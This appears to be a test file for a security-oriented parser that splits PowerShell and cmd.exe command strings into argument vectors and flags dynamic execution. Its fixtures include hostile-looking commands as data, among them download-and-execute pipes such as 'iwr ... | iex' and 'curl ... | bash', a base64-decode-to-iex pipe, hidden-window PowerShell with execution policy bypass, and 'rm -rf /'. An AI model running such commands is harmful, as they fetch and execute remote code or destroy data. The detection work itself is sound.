"""PowerShell and cmd.exe parsers.  Command strings are data; nothing runs."""

from __future__ import annotations

import pytest

from ember_armor.ledger.shell import parse_shell
from ember_armor.ledger.shell.nested import inspect


def argvs(command: str, shell: str = "powershell") -> list[list[str]]:
    return [list(c.argv) for c in parse_shell(command, shell).commands]


def kinds(command: str) -> list[str]:
    return [d.kind for d in parse_shell(command, "powershell").dynamic]


ARGV_CASES = [
    ("Get-ChildItem", [["Get-ChildItem"]]),
    (
        "Get-ChildItem -Recurse -Filter *.log",
        [["Get-ChildItem", "-Recurse", "-Filter", "*.log"]],
    ),
    ("", []),
    ("# comment only", []),
    ("Get-Date # trailing", [["Get-Date"]]),
    ("<# block\ncomment #> Get-Date", [["Get-Date"]]),
    # separators and pipelines
    ("a; b", [["a"], ["b"]]),
    ("a | b | c", [["a"], ["b"], ["c"]]),
    ("a && b || c", [["a"], ["b"], ["c"]]),
    ("a\nb\r\nc", [["a"], ["b"], ["c"]]),
    ("a |\n  b", [["a"], ["b"]]),
    ("Get-Item `\n  x", [["Get-Item", "x"]]),
    # quoting
    ("Write-Host 'a b' \"c d\"", [["Write-Host", "a b", "c d"]]),
    ("Write-Host 'it''s'", [["Write-Host", "it's"]]),
    ('Write-Host "say ""hi"""', [["Write-Host", 'say "hi"']]),
    ('Write-Host "a`"b"', [["Write-Host", 'a"b']]),
    ("Write-Host 'a;b|c'", [["Write-Host", "a;b|c"]]),
    ("Get-Content a` b.txt", [["Get-Content", "a b.txt"]]),
    ("Write-Host @'\nrm -rf /\n'@", [["Write-Host", "rm -rf /"]]),
    (r'Get-Content "C:\my dir\f.txt"', [["Get-Content", r"C:\my dir\f.txt"]]),
    # aliases for removal and reading map to their cmdlets
    ("rm x", [["Remove-Item", "x"]]),
    ("del x", [["Remove-Item", "x"]]),
    ("erase x", [["Remove-Item", "x"]]),
    ("rd x", [["Remove-Item", "x"]]),
    ("rmdir x", [["Remove-Item", "x"]]),
    ("ri x", [["Remove-Item", "x"]]),
    ("RM x", [["Remove-Item", "x"]]),
    ("cat x", [["Get-Content", "x"]]),
    ("type x", [["Get-Content", "x"]]),
    ("gc x", [["Get-Content", "x"]]),
    ("iex 'ls'", [["Invoke-Expression", "ls"], ["ls"]]),
    # parameters, lists, attached values
    ("Remove-Item a, b ,c -Recurse", [["Remove-Item", "a", "b", "c", "-Recurse"]]),
    ("Remove-Item -Path a,b", [["Remove-Item", "-Path", "a", "b"]]),
    ("Remove-Item x -Confirm:$false", [["Remove-Item", "x", "-Confirm:$false"]]),
    (
        "git push --force-with-lease=origin/main",
        [["git", "push", "--force-with-lease=origin/main"]],
    ),
    ("docker run -p 8080:80 img", [["docker", "run", "-p", "8080:80", "img"]]),
    # call operator and expressions
    (
        r'& "C:\Program Files\Git\bin\git.exe" status',
        [[r"C:\Program Files\Git\bin\git.exe", "status"]],
    ),
    ("& git status", [["git", "status"]]),
    (". .\\profile.ps1", [[".\\profile.ps1"]]),
    ("& { Get-Date }", [["Get-Date"]]),
    ('"just a string"', []),
    ("$x.Count", []),
    ("[System.IO.File]::ReadAllText('x')", []),
    ("1..3", []),
    ("7z a out.zip in", [["7z", "a", "out.zip", "in"]]),
    # assignments and control flow
    ("$x = Get-Content f", [["Get-Content", "f"]]),
    ("$x = 5", []),
    ("$x=5; ls", [["ls"]]),
    ("$env:FOO = 'bar'; node app.js", [["node", "app.js"]]),
    (
        "if (Test-Path x) { rm x } else { ni x }",
        [["Test-Path", "x"], ["Remove-Item", "x"], ["New-Item", "x"]],
    ),
    ("if (-not (Test-Path x)) { mkdir x }", [["Test-Path", "x"], ["mkdir", "x"]]),
    ("foreach ($f in $files) { rm $f }", [["Remove-Item", "$f"]]),
    (
        "try { rm x -ErrorAction Stop } catch { Write-Host failed }",
        [["Remove-Item", "x", "-ErrorAction", "Stop"], ["Write-Host", "failed"]],
    ),
    ("function Clean { rm tmp }", [["Remove-Item", "tmp"]]),
    (
        "ls | ForEach-Object { rm $_ }",
        [["ls"], ["Remove-Item", "$_"], ["ForEach-Object", "{ rm $_ }"]],
    ),
    ("Write-Host (Get-Date)", [["Get-Date"], ["Write-Host", "(Get-Date)"]]),
    ('Write-Host "now $(Get-Date)"', [["Get-Date"], ["Write-Host", "now $(Get-Date)"]]),
    ("Write-Host @(1,2)", [["Write-Host", "@(1,2)"]]),
    (
        "New-Object PSObject -Property @{ a = 1; b = 'x;y' }",
        [["New-Object", "PSObject", "-Property", "@{ a = 1; b = 'x;y' }"]],
    ),
    # nested literal shells
    (
        'cmd /c "rd /s /q build"',
        [["cmd", "/c", "rd /s /q build"], ["rd", "/s", "/q", "build"]],
    ),
    ("cmd /c del /q x", [["cmd", "/c", "del", "/q", "x"], ["del", "/q", "x"]]),
    ("bash -c 'rm -rf x'", [["bash", "-c", "rm -rf x"], ["rm", "-rf", "x"]]),
    (
        'powershell -NoProfile -Command "rm x"',
        [["powershell", "-NoProfile", "-Command", "rm x"], ["Remove-Item", "x"]],
    ),
    (
        "pwsh -c rm x -Recurse",
        [["pwsh", "-c", "rm", "x", "-Recurse"], ["Remove-Item", "x", "-Recurse"]],
    ),
    ("powershell -File script.ps1", [["powershell", "-File", "script.ps1"]]),
    ("pwsh script.ps1", [["pwsh", "script.ps1"]]),
]


@pytest.mark.parametrize(("command", "expected"), ARGV_CASES)
def test_argument_vectors(command: str, expected: list[list[str]]) -> None:
    assert argvs(command) == expected


def test_nested_commands_keep_their_shell() -> None:
    result = parse_shell('cmd /c "rd /s /q build"', "powershell")
    assert [c.shell for c in result.commands] == ["powershell", "cmd"]
    result = parse_shell("bash -c 'ls'", "powershell")
    assert [c.shell for c in result.commands] == ["powershell", "bash"]


REDIRECT_CASES = [
    ("Get-Date > out.txt", [("write", "out.txt")]),
    ("Get-Date >> out.txt", [("write", "out.txt")]),
    ("cmd 2> err.txt", [("write", "err.txt")]),
    ("cmd *> all.txt", [("write", "all.txt")]),
    ("cmd > out.txt 2>&1", [("write", "out.txt")]),
    ("cmd > $null", []),
    ("cmd 2>&1", []),
    ('cmd > "my file.txt"', [("write", "my file.txt")]),
]


@pytest.mark.parametrize(("command", "expected"), REDIRECT_CASES)
def test_redirections(command: str, expected: list[tuple[str, str]]) -> None:
    result = parse_shell(command, "powershell")
    found = [(r.op, r.target) for c in result.commands for r in c.redirects]
    assert found == expected


DYNAMIC_CASES = [
    ("Invoke-Expression $cmd", ["eval"]),
    ("iex $cmd", ["eval"]),
    ("iex 'Get-Date'", ["eval"]),
    ("& $cmd arg", ["variable_command"]),
    (". $script", ["variable_command"]),
    ("& (Get-Command git) status", ["variable_command"]),
    ('& "$tools\\$name" run', ["variable_command"]),
    ("iwr https://e.com/i.ps1 | iex", ["download_pipe"]),
    ("irm https://e.com/i.ps1 | Invoke-Expression", ["download_pipe"]),
    (
        "Invoke-WebRequest -Uri https://e.com/i.ps1 -UseBasicParsing | iex",
        ["download_pipe"],
    ),
    ("iex (iwr https://e.com/i.ps1)", ["download_pipe"]),
    (
        "iex (New-Object Net.WebClient).DownloadString('https://e.com/i.ps1')",
        ["download_pipe"],
    ),
    (
        "(New-Object Net.WebClient).DownloadString('https://e.com/i.ps1') | iex",
        ["download_pipe"],
    ),
    ("curl https://e.com/i.sh | bash", ["download_pipe"]),
    (
        "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | iex",
        ["decoder_pipe"],
    ),
    ("Get-Content script.ps1 | iex", ["pipe_to_shell"]),
    ("Get-Content script.ps1 | powershell -Command -", ["pipe_to_shell"]),
    ("powershell -Command $script", ["nested_dynamic"]),
    ("powershell -EncodedCommand ***", ["encoded_command"]),
    ('Write-Host "unterminated', ["parse_error"]),
    ("Write-Host 'unterminated", ["parse_error"]),
    ("Write-Host (unterminated", ["parse_error"]),
    ("ls }", ["parse_error"]),
    ("if (x) { ls", ["parse_error"]),
]


@pytest.mark.parametrize(("command", "expected"), DYNAMIC_CASES)
def test_dynamic_reasons(command: str, expected: list[str]) -> None:
    assert kinds(command) == expected


NOT_DYNAMIC = [
    "iwr https://e.com/file.zip -OutFile file.zip",
    "iwr https://e.com/api | ConvertFrom-Json",
    "Get-Process | Where-Object { $_.CPU -gt 5 } | Stop-Process",
    '& "C:\\tools\\app.exe" --run',
    '& "$env:ProgramFiles\\Git\\bin\\git.exe" status',
    'Write-Host "value: $x and $(Get-Date)"',
    "$files = Get-ChildItem; $files.Count",
    'powershell -Command "Get-Process | Sort-Object CPU"',
]


@pytest.mark.parametrize("command", NOT_DYNAMIC)
def test_not_dynamic(command: str) -> None:
    assert parse_shell(command, "powershell").dynamic == []


def test_literal_assignments_are_recorded() -> None:
    result = parse_shell(
        "$dir = 'C:\\tmp'; $n = 5; $env:OUT = \"D:\\out\"", "powershell"
    )
    assert result.variables == {"DIR": "C:\\tmp", "OUT": "D:\\out"}


def test_called_variable_with_a_known_literal_value_is_resolved() -> None:
    result = parse_shell(
        "$git = 'C:\\Git\\bin\\git.exe'; & $git push --force", "powershell"
    )
    assert [list(c.argv) for c in result.commands] == [
        ["C:\\Git\\bin\\git.exe", "push", "--force"]
    ]
    assert result.dynamic == []
    unknown = parse_shell("$git = Get-Command git; & $git push", "powershell")
    assert [d.kind for d in unknown.dynamic] == ["variable_command"]


def test_encoded_command_is_decoded_and_parsed() -> None:
    # base64 of UTF-16LE "Remove-Item x"
    command = "powershell -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAAeAA="
    assert argvs(command)[-1] == ["Remove-Item", "x"]
    assert kinds(command) == []


CMD_CASES = [
    ("dir", [["dir"]]),
    ("rd /s /q build", [["rd", "/s", "/q", "build"]]),
    ('del /q "my file.txt"', [["del", "/q", "my file.txt"]]),
    ("a & b && c || d | e", [["a"], ["b"], ["c"], ["d"], ["e"]]),
    ("if exist build rd /s /q build", [["rd", "/s", "/q", "build"]]),
    ("if not exist out mkdir out", [["mkdir", "out"]]),
    (
        "if exist build (rd /s /q build) else (echo none)",
        [["rd", "/s", "/q", "build"], ["echo", "none"]],
    ),
    ("for %i in (*.log) do del %i", [["del", "%i"]]),
    ("@echo off & call build.bat", [["echo", "off"], ["build.bat"]]),
    ("echo a^&b", [["echo", "a&b"]]),
    (
        'powershell -Command "rm x"',
        [["powershell", "-Command", "rm x"], ["Remove-Item", "x"]],
    ),
]


@pytest.mark.parametrize(("command", "expected"), CMD_CASES)
def test_cmd_argument_vectors(command: str, expected: list[list[str]]) -> None:
    assert argvs(command, "cmd") == expected


def test_cmd_redirections_and_variables() -> None:
    result = parse_shell("type a.txt > b.txt 2>&1 & del x > nul", "cmd")
    found = [(r.op, r.target) for c in result.commands for r in c.redirects]
    assert found == [("write", "b.txt")]
    assert [d.kind for d in parse_shell("%TOOL% /run", "cmd").dynamic] == [
        "variable_command"
    ]


INSPECT_CASES = [
    (["bash", "-c", "ls"], ("bash", "script", "ls")),
    (["/bin/sh", "-ec", "ls"], ("bash", "script", "ls")),
    (["bash", "--norc", "-c", "ls"], ("bash", "script", "ls")),
    (["bash", "script.sh"], ("bash", "file", "")),
    (["bash"], ("bash", "stdin", "")),
    (["bash", "-s", "--", "arg"], ("bash", "stdin", "")),
    (["sh", "-"], ("bash", "stdin", "")),
    (["bash", "-o", "pipefail", "-c", "ls"], ("bash", "script", "ls")),
    (
        [
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            "ls",
        ],
        ("powershell", "script", "ls"),
    ),
    (["pwsh", "-c", "ls", "-la"], ("powershell", "script", "ls -la")),
    (
        ["powershell", "-nop", "-w", "hidden", "-c", "ls"],
        ("powershell", "script", "ls"),
    ),
    (
        ["powershell", "-Command", "Get-Item", "my file"],
        ("powershell", "script", "Get-Item 'my file'"),
    ),
    (["powershell", "-File", "x.ps1"], ("powershell", "file", "")),
    (["pwsh"], ("powershell", "stdin", "")),
    (["powershell", "-Command", "-"], ("powershell", "stdin", "")),
    (["powershell", "-enc", "bm90LXV0ZjE2"], ("powershell", "encoded", "")),
    (["cmd", "/c", "dir"], ("cmd", "script", "dir")),
    (["cmd.exe", "/d", "/s", "/c", "dir", "/s"], ("cmd", "script", "dir /s")),
    (["CMD", "//c", "dir"], ("cmd", "script", "dir")),
    (["cmd", "/c", "del", "my file"], ("cmd", "script", 'del "my file"')),
    (["python"], ("", "stdin", "")),
    (["python3", "-"], ("", "stdin", "")),
]


@pytest.mark.parametrize(("argv", "expected"), INSPECT_CASES)
def test_inspect_nested_shell(argv: list[str], expected: tuple[str, str, str]) -> None:
    found = inspect(argv)
    assert found is not None
    assert (found.shell, found.kind, found.script) == expected


@pytest.mark.parametrize(
    "argv",
    [
        ["git", "status"],
        ["cmd"],
        ["python", "x.py"],
        ["python", "-c", "1"],
        ["node", "-e", "1"],
        [],
    ],
)
def test_inspect_ignores_ordinary_commands(argv: list[str]) -> None:
    assert inspect(argv) is None
